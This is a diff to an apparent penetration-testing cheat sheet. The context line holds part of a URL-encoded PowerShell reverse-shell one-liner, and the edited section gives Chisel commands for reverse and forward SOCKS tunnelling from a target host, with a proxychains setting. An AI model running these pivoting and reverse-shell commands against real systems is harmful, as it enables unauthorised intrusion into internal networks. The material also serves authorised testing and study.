@@ -39,15 +39,27 @@ powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPCl
 
 
 # Internal Network Acess (Reverse Port Forwarding)
-#### Chisel (Reverse Connection):
+#### Chisel :
 > Make sure to add `socks5	127.0.0.1 1080` in **/etc/proxychains4.conf** file.
-- On the local machine:
 ```bash
+==================== REVERSE PORT FORWARDING ============================
+
+# On the local machine:
+
 ./chisel server -p 8000 --reverse
-```
-- On target host:
+
+# On target host:
 ```bash
 ./chisel client <LHOST>:8000 R:socks
+
+
+==================== PORT FORWARDING ============================
+
+# Port Forwarding using Chisel
+
+.\chisel.exe server -p 18000 --socks5        # On Target Host
+
+chisel client 10.200.96.150:18000 1080:socks        # On Attacking machine
 ```
 #### Internal Network access using SShuttle:
 ```bash
